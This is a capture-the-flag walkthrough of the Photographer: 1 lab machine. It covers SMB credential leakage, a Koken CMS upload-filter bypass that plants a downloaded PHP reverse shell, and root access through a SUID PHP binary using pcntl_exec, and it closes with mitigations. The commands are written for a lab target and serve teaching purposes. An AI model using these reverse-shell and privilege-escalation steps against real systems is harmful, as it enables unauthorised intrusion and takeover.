# Photographer: 1 — Walkthrough

| Field | Detail |
|---|---|
| Machine | Photographer: 1 |
| Series | Photographer |
| Author | v1n1v131r4 |
| Release Date | 21 Jul 2020 |
| OS | Linux |

## 🔍 Overview

Photographer: 1 is a Linux machine involving SMB share enumeration to recover leaked credentials, exploitation of the Koken CMS admin panel via an arbitrary file upload vulnerability (bypassed using Burp Suite request tampering), and privilege escalation through a SUID-configured PHP binary abused via `pcntl_exec` (per GTFOBins).

**Machine Details**

- Target IP: `192.168.1.18`

---

## Step 1 – Network Scanning

```bash
nmap -sC -sV 192.168.1.18
```

**Open Ports:**

| Port | Service |
|---|---|
| 22/tcp | SSH |
| 80/tcp | HTTP |
| 139/tcp | SMB (Samba) |
| 445/tcp | SMB (Samba) |
| 8000/tcp | HTTP (alternate) |

---

## Step 2 – SMB Share Discovery

```bash
smbmap -H 192.168.1.18
```

**Found:** A share named `sambashare` with read-only permissions ("Photographer's public share").

---

## Step 3 – Download SMB Files

```bash
smbclient //192.168.1.18/sambashare
get mail.txt
get wordpress.bkp.zip
```

**Reviewed `mail.txt`** and found:

- Two email addresses tied to CMS user accounts
- A password hint referencing a personal nickname, leading to a candidate password

---

## Step 4 – HTTP Enumeration (Port 80)

```bash
curl http://192.168.1.18/
```

Identified the CMS in use as **Koken**, version `0.22.24` (via Wappalyzer).

---

## Step 5 – HTTP Enumeration (Port 8000)

```bash
curl http://192.168.1.18:8000/
```

Confirmed the same Koken CMS instance running on the alternate port.

```bash
searchsploit koken 0.22.24
```

**Found:** An authenticated arbitrary file upload vulnerability affecting this Koken version.

---

## Step 6 – Login to Koken Admin

Logged into the Koken admin panel at `http://192.168.1.18:8000/admin` using the credentials recovered from the SMB share's `mail.txt`.

---

## Step 7 – Prepare a Reverse Shell Payload

```bash
curl -o php-reverse-shell.php https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Edited the payload to point to the attacker's IP and listening port, then renamed the file with an image extension (`.jpg`) to bypass the upload filter, which only accepted `jpg`, `png`, `gif`, and `mp4`.

---

## Step 8 – Bypass the File Upload Filter with Burp Suite

Intercepted the upload request in Burp Suite while attempting to import the disguised payload through the Koken admin panel, then modified the `filename` field in the intercepted request to strip the fake `.jpg` extension — restoring the actual `.php` extension before forwarding the request.

---

## Step 9 – Verify the Upload

Located the uploaded file's path under Koken's storage directory (`/storage/originals/...`) to confirm the PHP payload had been accepted and stored on the server.

---

## Step 10 – Set Up a Netcat Listener

```bash
nc -lnvp 443
```

---

## Step 11 – Trigger the Reverse Shell

Requested the uploaded PHP file's URL directly (via browser or `curl`), triggering execution on the server.

**Result:** Reverse shell received as `www-data`.

---

## Step 12 – Upgrade to an Interactive Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 13 – Identify SUID Binaries

```bash
find / -type f -perm /4000 2>/dev/null | head -20
which php7.2
ls -la /usr/bin/php*
```

**Found:** `/usr/bin/php7.2` had the SUID bit set (`rwsr-xr-x`), owned by `root`.

---

## Step 14 – Research Exploitation via GTFOBins

Checked [GTFOBins](https://gtfobins.github.io/) for `php` and found a documented technique for abusing a SUID PHP binary using the `pcntl_exec` function to spawn a privileged shell.

---

## Step 15 – Exploit the SUID PHP Binary

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```

This replaces the current process with `/bin/sh` using the `-p` flag to preserve the elevated (root) privileges inherited from the SUID binary.

**Verification:**

```bash
whoami
id
```

**Result:** `euid=0(root)` — effective root privileges obtained despite the real UID still showing `www-data`.

---

## Step 16 – Flag Capture

```bash
cat /root/proof.txt
```

✅ **Root flag captured — machine fully compromised.**

---

## 🛡️ Key Vulnerabilities Identified

1. Credentials leaked via an SMB share accessible without authentication
2. Weak/predictable password derived from a personal hint
3. Arbitrary file upload in Koken CMS, exploitable once authenticated
4. Client-side file type filtering that could be bypassed via request tampering
5. A SUID-configured PHP binary with dangerous functions (`pcntl_exec`) enabled, allowing full privilege escalation

## 🩹 Mitigations

1. Restrict or disable unauthenticated/read access to SMB shares containing sensitive files
2. Never store credentials or credential hints in plaintext files
3. Patch CMS platforms promptly and restrict file upload functionality by MIME type validation (not just extension)
4. Validate file uploads server-side, not just via client-visible extension checks
5. Remove the SUID bit from interpreters like PHP (`chmod u-s /usr/bin/php7.2`)
6. Disable dangerous PHP functions in production (`pcntl_exec`, `system`, `passthru`, `shell_exec`, `eval`)
7. Regularly audit SUID binaries system-wide (`find / -perm -4000 -type f`)
8. Apply the principle of least privilege throughout the system

---

## 🧰 Tools Used

`nmap` · `smbmap` · `smbclient` · `searchsploit` · `Burp Suite` · `netcat` · `python (pty)` · GTFOBins

## 🧠 Techniques Covered

Network scanning · SMB share enumeration · Credential leakage analysis · CMS vulnerability research · File upload filter bypass · Reverse shell handling · SUID binary abuse · GTFOBins-based privilege escalation

---

## Summary

| Step | Description | Status |
|---|---|---|
| 1 | Network Scanning | ✅ |
| 2 | SMB Share Discovery | ✅ |
| 3 | Download SMB Files | ✅ |
| 4 | HTTP Enumeration (Port 80) | ✅ |
| 5 | HTTP Enumeration (Port 8000) | ✅ |
| 6 | Login to Koken Admin | ✅ |
| 7 | Prepare Reverse Shell Payload | ✅ |
| 8 | Bypass Upload Filter (Burp Suite) | ✅ |
| 9 | Verify the Upload | ✅ |
| 10 | Set Up Netcat Listener | ✅ |
| 11 | Trigger the Reverse Shell | ✅ |
| 12 | Upgrade to Interactive Shell | ✅ |
| 13 | Identify SUID Binaries | ✅ |
| 14 | Research via GTFOBins | ✅ |
| 15 | Exploit SUID PHP Binary | ✅ |
| 16 | Flag Capture | ✅ |

*Writeup for educational purposes. Machine solved as part of the "Photographer" series.*
